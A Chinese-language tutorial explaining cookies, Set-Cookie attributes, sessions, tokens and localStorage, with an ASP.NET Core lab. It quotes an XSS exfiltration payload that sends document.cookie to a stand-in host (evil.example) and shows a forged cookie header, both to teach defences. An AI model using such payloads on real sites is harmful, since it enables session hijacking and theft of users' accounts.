XSS 那張圖裡被偷走的 cookie 到底是什麼？伺服器怎麼給、瀏覽器怎麼帶、為什麼偷到就能冒充你？Session、Token、localStorage 又和它差在哪？

  • 看了編碼器那頁 3-1 的 XSS 圖，想知道 document.cookie 讀到的是什麼
  • 想知道「登入之後，伺服器怎麼記得我是誰」
  • 聽過 Session、Token、JWT、localStorage，不知道它們和 cookie 差在哪

這頁以觀念為主，最後有一個小實驗：起一個會發 cookie 的小網站，一步加一樣，親眼看 header 怎麼變。

目錄

  2. Cookie 是什麼：一張瀏覽器自動帶的號碼牌

  6. 小實驗：起一個會發 cookie 的小網站

1. HTTP 不記得你：為什麼需要 cookie

每一個 HTTP 請求都是獨立的一封信。伺服器收到、處理、回覆，然後就忘了。下一封信來的時候，伺服器不知道它和上一封是不是同一個人寄的。這叫 HTTP 的無狀態（stateless）。

用一個會回答「你是誰」的 endpoint 實際試：連打兩次 GET /me，伺服器兩次都說不認識你。

GET /me
→ 200 OK
沒有 cookie，不知道你是誰

GET /me
→ 200 OK
沒有 cookie，不知道你是誰

可是部落格登入之後，再點「我的文章」，伺服器得知道你是誰。要讓無狀態的 HTTP 認得出「這幾封信是同一個人寄的」，就得在每封信上放一個記號。這個記號最常見的做法，就是 cookie。

2. Cookie 是什麼：一張瀏覽器自動帶的號碼牌

Cookie 是伺服器請瀏覽器記住的一小段文字，格式是「名字=值」。伺服器在回應裡發一次，瀏覽器之後每次對同一個網站的請求都自動帶回去，伺服器就認得出「這幾個請求是同一個人」。

上排：沒有號碼牌，每次都是陌生人。下排：第一次回應發號碼牌，之後瀏覽器自己每次帶回

把下排拆成三步，用 curl -i 看每一步實際的 header（第 6 節小實驗的前兩步跑出來的）。藍色是這一步多出來的那一行；Date 這類和 cookie 無關的 header 省略沒列。

第 1 步：還沒有 cookie

curl -i http://localhost:5050/me

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Server: Kestrel

沒有 cookie，不知道你是誰

請求裡沒有任何能辨認身分的東西，回應也只有一般的 header。這是第 1 節的情況。

第 2 步：伺服器在回應裡發一張

換打 /login。這個 endpoint 做的事只有一件：在回應加一行 Set-Cookie。

curl -i http://localhost:5050/login

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Server: Kestrel
Set-Cookie: user=alice; path=/

已登入，看回應 header 裡的 Set-Cookie

user=alice 就是號碼牌：名字是 user，值是 alice。分號後面的 path=/ 是 ASP.NET Core 自動加上的，意思是「這個網站的每一個路徑都帶」；這一節只看分號前面那一段。

瀏覽器收到這一行，就把 user=alice 記在這個網站名下。

第 3 步：下一個請求把它帶回去

瀏覽器之後對這個網站發的每一個請求，都會自己加上一行 Cookie header。curl 不會自己記 cookie，所以這裡用 -H 手動加上同一行，模擬瀏覽器做的事：

curl -i -H "Cookie: user=alice" http://localhost:5050/me

請求送出的 header 多了一行：
Cookie: user=alice

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Server: Kestrel

你是 alice

和第 1 步是同一個網址，差別只有請求多了那一行，伺服器就認得了。兩個 header 的名字差一個 Set：Set-Cookie 是伺服器→瀏覽器，Cookie 是瀏覽器→伺服器。

三步接起來：

sequenceDiagram participant B as 瀏覽器 participant S as 你的 API B->>S: GET /me（沒有 Cookie header） S-->>B: 200「沒有 cookie，不知道你是誰」 B->>S: GET /login S-->>B: 200 + Set-Cookie: user=alice Note over B: 瀏覽器把 user=alice 放進 cookie 罐 B->>S: GET /me + Cookie: user=alice（瀏覽器自動加） S-->>B: 200「你是 alice」 B->>S: 之後每一個請求都自動帶 Cookie: user=alice
Set-Cookie 是伺服器→瀏覽器的 header，Cookie 是瀏覽器→伺服器的 header，名字差一個 Set

四件事要抓住：

  • 瀏覽器自動帶。前端程式一行都沒寫，瀏覽器自己在每個請求加上 Cookie header。這是 cookie 最大的方便，也是它所有安全問題的來源：只要是「從這個瀏覽器發出、送往這個網站」的請求，不管是誰觸發的，都帶著。
  • 綁網站。cookie 屬於發它的那個網站。對 localhost:5050 的請求才會帶 user=alice，對別的網站不帶，別的網站也看不到它。
  • 只是文字。伺服器給什麼，瀏覽器就記什麼，沒有加密。所以 cookie 裡放的通常是「識別用的鑰匙」（一串亂數、一個簽過名的憑證），不是密碼這種機密本身。
  • 在哪裡看。瀏覽器 F12 → Application → Cookies；或 curl -i 看回應 header；或 Rider 的 .http 檔，回應 header 會直接列出來。

正式語法：ASP.NET Core 怎麼發、怎麼讀、怎麼刪

以 ASP.NET Core 為例，三個動作各是一行。

發：在回應加一行 Set-Cookie（IResponseCookies.Append）

Response.Cookies.Append("user", "alice");
// 回應多一行：Set-Cookie: user=alice; path=/

讀：從請求的 Cookie header 拿，沒有就是 null（IRequestCookieCollection）

string? user = Request.Cookies["user"];

刪：伺服器碰不到瀏覽器裡的 cookie，做法是再發一張同名、值是空的、到期時間在過去的，瀏覽器收到就把原本那張丟掉

Response.Cookies.Delete("user");
// 回應多一行：Set-Cookie: user=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/

在 Controller 裡，Request 和 Response 是 ControllerBase 的屬性，直接用；在 Minimal API 的 lambda 裡要先接一個 HttpContext 參數，再用 context.Request、context.Response。

3. Cookie 的屬性：給號碼牌加規則

第 2 節那張號碼牌只有名字和值。Set-Cookie 的分號後面可以再加屬性：它們不會被帶回伺服器，是寫給瀏覽器看的規則，決定這張號碼牌留多久、誰能讀、什麼時候帶。

下面從一個屬性都不設的版本開始，一步加一個。每一步先講少了它會怎樣，再加上去看 header 變成什麼。藍色是這一步多出來的屬性；header 都是實際跑出來的。在 ASP.NET Core，屬性寫在 Append 的第三個參數 CookieOptions 裡。

第 1 步：一個屬性都不設

Response.Cookies.Append("user", "alice");

Set-Cookie: user=alice; path=/

這張號碼牌沒有寫有效期。沒寫有效期的 cookie，瀏覽器關掉就消失，叫 session cookie。使用者每次重開瀏覽器都要重新登入。

第 2 步：加 Max-Age，指定留多久

Response.Cookies.Append("user", "alice", new CookieOptions
{
    MaxAge = TimeSpan.FromMinutes(30)
});

Set-Cookie: user=alice; max-age=1800; path=/

max-age 的單位是秒，1800 秒就是 30 分鐘。時間一到，瀏覽器自己把它丟掉，之後的請求不再帶。把時間改成 2 秒實測：curl 用 -c、-b 模擬瀏覽器記 cookie，馬上打 /me 有帶，等 3 秒再打就沒帶了。

另一個屬性 Expires 做同一件事，寫的是「到期的時刻」而不是「還有幾秒」，例如 expires=Wed, 18 Nov 2026 08:06:41 GMT。

第 3 步：加 HttpOnly，JavaScript 讀不到

到這裡，網頁裡的 JavaScript 可以用 document.cookie 讀到這張號碼牌。頁面上只要被人放進一段惡意的 JavaScript，它就能把號碼牌讀出來送走。

Response.Cookies.Append("user", "alice", new CookieOptions
{
    MaxAge = TimeSpan.FromMinutes(30),
    HttpOnly = true
});

Set-Cookie: user=alice; max-age=1800; path=/; httponly

加上之後，document.cookie 讀不到它，但請求照樣自動帶。HttpOnly 只擋「讀」，不擋「帶」。

第 4 步：加 SameSite，別的網站發起的請求不帶

「瀏覽器自動帶」有一個副作用：請求不一定是這個網站自己的頁面觸發的。假設你登入了 blog.example，cookie 還有效。這時你打開一個惡意網站，它的頁面裡藏了一個指向 blog.example/api/posts/1 的刪除請求。瀏覽器看到目的地是 blog.example，就照規則把 cookie 帶上，伺服器看到有效的號碼牌，就真的刪了。你什麼都沒點，文章就不見了。這叫 CSRF（跨站請求偽造）。

Response.Cookies.Append("user", "alice", new CookieOptions
{
    MaxAge = TimeSpan.FromMinutes(30),
    HttpOnly = true,
    SameSite = SameSiteMode.Lax
});

Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly

SameSite 告訴瀏覽器：從別的網站發起的請求，要不要帶這張號碼牌。有三個值：

  • Strict：從別的網站連過來的請求一律不帶
  • Lax：只有「點連結這種最上層的 GET」才帶，其餘不帶。惡意網站藏的那個刪除請求就變成沒有號碼牌的陌生人
  • None：都帶，但必須同時設 Secure

ASP.NET Core 的 CookieOptions.SameSite 預設是 Unspecified，也就是不輸出這個屬性（前三步的 header 裡都沒有它）；現在的瀏覽器把沒寫的當成 Lax。官方說明：Work with SameSite cookies in ASP.NET Core。

第 5 步：加 Secure，只在 https 連線才帶

http 連線的內容沒有加密，Cookie header 在路上是明文。Secure 讓瀏覽器只在 https 連線才帶這張號碼牌：

Response.Cookies.Append("user", "alice", new CookieOptions
{
    MaxAge = TimeSpan.FromMinutes(30),
    HttpOnly = true,
    SameSite = SameSiteMode.Lax,
    Secure = true
});

Set-Cookie: user=alice; max-age=1800; path=/; secure; samesite=lax; httponly

本機用 http 測試時先不設，所以這頁的小實驗停在第 4 步的樣子。

第 6 步：Path 和 Domain，縮小帶的範圍

前面每一步的 header 裡都有 path=/：網址路徑在 / 底下才帶，也就是全站。把它改小，cookie 就只在那個路徑底下才帶：

Response.Cookies.Append("user", "alice", new CookieOptions
{
    Path = "/admin"
});

Set-Cookie: user=alice; path=/admin

實測：curl 用 -c、-b 模擬瀏覽器，打 /me 時沒有帶這張 cookie，打 /admin/me 時有帶。

Domain 管的是哪些網域會帶。沒設就只有發它的那一台主機；設了可以讓子網域共用。

全部放在一起讀

第 4 步的那一行，從左到右：

Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly
            ─────┬────  ────┬───────  ──┬───  ─────┬──────  ───┬────
            名字=值      30 分鐘後失效   全站都帶  別站連過來少帶  JS 讀不到

之後看到陌生的 Set-Cookie，一樣用分號切開，一段一段對：max-age／expires 管留多久，path／domain 管哪些網址帶，secure 管連線，httponly 管 JavaScript 能不能讀，samesite 管別的網站發起的請求帶不帶。

4. 類似的東西：Session、Token、localStorage

前面的號碼牌直接寫著 user=alice。這一節先看這樣寫有什麼問題，再看三個常聽到的名詞各自是在解決哪一個問題，最後放在一起比。

第 1 步：號碼牌上直接寫名字，誰都能自己寫一張

伺服器從來沒有發過 user=bob。但 Cookie header 是用戶端送的，想寫什麼就寫什麼（實測，紅色是自己亂寫的那一段）：

curl -i -H "Cookie: user=bob" http://localhost:5050/me

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Server: Kestrel

你是 bob

伺服器只看號碼牌上的字，就把這個請求當成 bob。所以號碼牌上不能直接寫「我是誰」，要放別人猜不到、也造不出來的東西。常見的做法有兩種：放一串亂數（Session），或放一段伺服器簽過名的文字（Token）。

第 2 步：Session，cookie 裡只放一串亂數

登入時伺服器產生一串很長的亂數當作 id，把「這個 id 是 alice」記在伺服器這一邊（記憶體、Redis、資料庫），cookie 裡只放那個 id。以 ASP.NET Core 的 Session 為例，發出來的 cookie 長這樣（實測，值很長，中間省略）：

Set-Cookie: .AspNetCore.Session=CfDJ8NH89n6BXv5I…AdPyZq2wp; path=/; samesite=lax; httponly

cookie 裡看不到 alice 這個名字。隨便寫一個值（例如 .AspNetCore.Session=abc123）送過去，伺服器對不到任何一份資料，就當作沒登入（實測）。

Session 不是和 cookie 對立的東西，而是「資料放伺服器、cookie 裡只放鑰匙」的用法。鑰匙被別人拿到一樣會被冒充，所以第 3 節那些屬性它全部適用；上面那一行裡就有 samesite=lax 和 httponly。資料在閒置逾時（ASP.NET Core 預設 20 分鐘）或伺服器清掉時消失。

📎 補充：ASP.NET Core 的 Session 怎麼開

Session 在 ASP.NET Core 不是預設開的，要在 Program.cs 登記三行（實測；少了第一行，程式啟動時會丟出找不到 IDistributedCache 的例外）：

// 登記存放 session 資料的地方：這台伺服器的記憶體
builder.Services.AddDistributedMemoryCache();

// 登記 session 服務
builder.Services.AddSession();

// 加進 pipeline：每個請求進來先找 cookie 裡的 session id，對應到伺服器上的那份資料
app.UseSession();

之後 HttpContext.Session.SetString("user", "alice") 寫、GetString("user") 讀。瀏覽器拿到的 cookie 名字預設是 .AspNetCore.Session，值是一串加密過的 id，資料本身不在裡面。官方文件：Session and state management in ASP.NET Core。

第 3 步：Token，前端程式自己放進請求

Session 還是靠 cookie，所以還是「瀏覽器自動帶」，別的網站能借這個瀏覽器發請求（第 3 節第 4 步的 CSRF），要靠 SameSite 擋。

另一條路是完全不靠自動帶。登入時伺服器發一段簽過名的文字，叫 Token（常見的格式是 JWT），內容有到期時間，改過一個字簽名就對不上。前端程式拿到之後，每次發請求時自己在 header 加一行：

Authorization: Bearer 這裡是那段 token

瀏覽器不會自動加這一行。別的網站的程式碼拿不到這段 token，發出來的請求裡就沒有它，所以沒有 CSRF 的問題。代價是前端程式得自己找地方放這段 token。

第 4 步：localStorage，前端程式放東西的地方

瀏覽器給每個網站的前端程式一塊存放空間，叫 localStorage（另一個 sessionStorage 用法相同，關分頁就清空）。它和 cookie 有三個差別：伺服器完全看不到也設定不了、瀏覽器從不自動帶、JavaScript 一定讀得到。

Token 常放在這裡。問題也在這裡：JavaScript 讀得到，頁面上被放進惡意的 JavaScript 時，token 就被整個搬走，而且它沒有 HttpOnly 這種屬性可以設。

四個放在一起比

左邊住在瀏覽器，右邊住在伺服器；綠色箭頭是瀏覽器自動帶的，藍色箭頭是前端程式自己加的
東西存在哪裡誰把它放進請求伺服器能設定它嗎JavaScript 讀得到嗎什麼時候消失
Cookie瀏覽器的 cookie 罐瀏覽器自動能（Set-Cookie）預設能；設 HttpOnly 後不能Max-Age 到期、關瀏覽器（沒設期限時）、伺服器 Delete
Session（伺服器端）伺服器（記憶體、Redis、資料庫）。瀏覽器只拿到一個裝著 session id 的 cookie瀏覽器自動（id 在 cookie 裡）能資料本身讀不到，只有 id 的 cookie閒置逾時（ASP.NET Core 預設 20 分鐘）或伺服器清掉
Token（例如 JWT）放 Authorization header前端程式決定：變數、localStorage、也可以放 cookie前端程式自己加 Authorization: Bearer …發得出來，但放哪裡由前端決定看放哪裡：放 localStorage 就讀得到token 本身有到期時間
localStorage / sessionStorage瀏覽器，伺服器完全看不到從不自動帶不能能localStorage 到你清掉為止；sessionStorage 關分頁就消失

表格裡最重要的是「誰把它放進請求」和「JavaScript 讀得到嗎」這兩欄，因為它們決定各自怕什麼：

  • 瀏覽器自動帶的（cookie、靠 cookie 的 session）：方便，但別的網站也能借你的瀏覽器發請求，所以要靠 SameSite 擋 CSRF。
  • 前端程式自己帶的（token）：別的網站的程式碼拿不到你的 token，沒有 CSRF 的問題；但 token 放在 localStorage 時 JavaScript 讀得到，XSS 一來就被整個搬走。

給前端框架（React 之類）呼叫的 Web API 常走 token 這條路；傳統「伺服器產生整個網頁」的網站多半走 cookie + session。這頁只看它們放在哪裡、誰帶；JWT 裡面長什麼樣是另一個主題。

5. 回到 XSS：偷到 cookie 為什麼就能冒充你

編碼器那頁 3-1 的攻擊字串是 fetch("https://evil.example/?c=" + document.cookie)。現在可以把它拆開了：

  • document.cookie 讀的是這個網站所有沒設 HttpOnly 的 cookie，格式像 user=alice; theme=dark。
  • 攻擊者拿到 user=alice 之後，在自己的瀏覽器設一個一模一樣的 cookie，再打 GET /me。伺服器只看號碼牌，號碼牌一樣，就把他當成 alice。這叫 session hijacking（劫持）。
  • 設了 HttpOnly，document.cookie 就看不到 user=alice，上面那段程式碼送出去的是空的。這是 HttpOnly 的價值。
  • 但 XSS 的程式碼還是在你的網站上跑。它可以直接 fetch("/api/posts/1", { method: "DELETE" })，瀏覽器看到目的地是你的網站，照樣自動帶 cookie，伺服器照樣當成 alice 在操作。HttpOnly 擋得了「偷走號碼牌」，擋不了「借用你的瀏覽器」。

所以順序是：先用輸出時編碼讓 XSS 根本跑不起來，再用 HttpOnly 當第二道保險。兩個都要。

6. 小實驗：起一個會發 cookie 的小網站

第 2 節的 header 就是這個實驗跑出來的。不用開專案，一個 .cs 檔就能起網站。

正式語法：.NET 10 單檔程式起一個 Web 伺服器

// 第一行：告訴 SDK 這是 Web 專案，不然沒有 WebApplication 這些型別
#:sdk Microsoft.NET.Sdk.Web

WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
WebApplication app = builder.Build();

// 一個 endpoint：lambda 接 HttpContext 就能碰 Request 和 Response
app.MapGet("/hello", (HttpContext context) => "hi");

// 指定網址和 port 啟動；終端機按 Ctrl+C 停掉。port 被佔用就換一個數字
app.Run("http://localhost:5050");
# 放在任何「沒有 .csproj」的資料夾
dotnet run cookie-lab.cs

官方文件：File-based apps（#:sdk 指令在這頁）、Minimal APIs（MapGet）。這個實驗只回傳字串，不需要編碼器那頁第 8 節說的 PublishAot 設定；如果你改成回傳物件（JSON），會不會需要，自己試試看。

實驗：/login 發號碼牌，/me 認人

從上面那個只有 /hello 的程式開始，一步只加一樣東西。每一步都重新執行，用 curl -i（或 Rider 的 .http 檔）看 header 有沒有變成那一步寫的樣子。

第 1 步：只寫 GET /me

讀 user 這個 cookie。有就回「你是 alice」（名字用讀到的值），沒有就回「沒有 cookie，不知道你是誰」。這時候還沒有人發 cookie，但 Cookie header 可以自己手寫，所以已經能測兩種情況。

curl -i http://localhost:5050/me
curl -i -H "Cookie: user=alice" http://localhost:5050/me

✅ 第一個回「沒有 cookie，不知道你是誰」，第二個回「你是 alice」

第 2 步：加 GET /login，發一張什麼屬性都沒有的 cookie

名字 user、值 alice，回傳一句話。然後用 -c、-b 讓 curl 像瀏覽器一樣自己記、自己帶：

curl -i http://localhost:5050/login

# -c 把回應的 Set-Cookie 記進 jar.txt，-b 讓下一個請求帶上 jar.txt 裡的 cookie
curl -s -c jar.txt http://localhost:5050/login
curl -s -b jar.txt http://localhost:5050/me

✅ /login 的回應有 Set-Cookie: user=alice; path=/；最後一行回「你是 alice」

第 3 步：加有效期，30 分鐘

✅ Set-Cookie: user=alice; max-age=1800; path=/

第 4 步：用瀏覽器看，再加 HttpOnly

用瀏覽器打開 /login，再打開 /me，看瀏覽器自己帶了；F12 → Application → Cookies 看那張號碼牌。接著在 F12 → Console 打 document.cookie，看到什麼？加上 HttpOnly 重新執行、重新打開 /login，再打一次 document.cookie。這就是第 5 節第三點。

✅ Set-Cookie: user=alice; max-age=1800; path=/; httponly；設 HttpOnly 後 document.cookie 是空字串，/me 照樣回「你是 alice」

第 5 步：加 SameSite=Lax

✅ Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly

💡 提示

  • 讀 cookie：context.Request.Cookies["user"]，型別是 string?
  • 發 cookie：context.Response.Cookies.Append("user", "alice")；要設屬性時多傳第三個參數 options
  • 屬性：CookieOptions 的 MaxAge（TimeSpan.FromMinutes(30)）、HttpOnly（true）、SameSite（SameSiteMode.Lax），寫法在第 3 節每一步
  • .http 檔帶 cookie：在請求行下面加一行 Cookie: user=alice
參考答案（寫完再打開）

cookie-lab.cs

#:sdk Microsoft.NET.Sdk.Web

WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
WebApplication app = builder.Build();

// 登入：伺服器在回應裡放一個 Set-Cookie header，瀏覽器收到就會記起來
app.MapGet("/login", (HttpContext context) =>
{
    CookieOptions options = new CookieOptions
    {
        HttpOnly = true,              // JavaScript 的 document.cookie 讀不到
        SameSite = SameSiteMode.Lax,  // 從別的網站連過來的請求，大部分不帶這個 cookie
        MaxAge = TimeSpan.FromMinutes(30)
    };
    context.Response.Cookies.Append("user", "alice", options);
    return "已登入，看回應 header 裡的 Set-Cookie";
});

// 之後的請求：瀏覽器自動把 cookie 放進 Cookie header 帶回來，伺服器從 Request.Cookies 讀
app.MapGet("/me", (HttpContext context) =>
{
    string? user = context.Request.Cookies["user"];
    return user is null ? "沒有 cookie，不知道你是誰" : "你是 " + user;
});

app.Run("http://localhost:5050");

上面是做完第 5 步的樣子。前面幾步的 /login 只差在 options 裡有幾個屬性：第 2 步沒有 options，直接 Append("user", "alice")；第 3 步只有 MaxAge；第 4 步多 HttpOnly。

做完第 5 步之後，curl 實際跑出來的（.NET SDK 10.0.303）：

curl -i http://localhost:5050/me
# HTTP/1.1 200 OK
# Content-Type: text/plain; charset=utf-8
# Server: Kestrel
#
# 沒有 cookie，不知道你是誰

curl -i http://localhost:5050/login
# HTTP/1.1 200 OK
# Content-Type: text/plain; charset=utf-8
# Server: Kestrel
# Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly
#
# 已登入，看回應 header 裡的 Set-Cookie

curl -i -H "Cookie: user=alice" http://localhost:5050/me
# HTTP/1.1 200 OK
# ...
# 你是 alice

# 模擬瀏覽器：-c 把 Set-Cookie 記進 jar.txt，-b 下一次自動帶
curl -s -c jar.txt http://localhost:5050/login
curl -s -b jar.txt http://localhost:5050/me
# 你是 alice

jar.txt 打開看，curl 記下的就是瀏覽器 cookie 罐裡的那一筆，連 HttpOnly 都標了：

#HttpOnly_localhost	FALSE	/	FALSE	1793247796	user	alice

沒設 HttpOnly 時，瀏覽器 Console 打 document.cookie 會印出 "user=alice"；設了之後印出 ""，但 /me 照樣回「你是 alice」，因為請求還是自動帶著它。
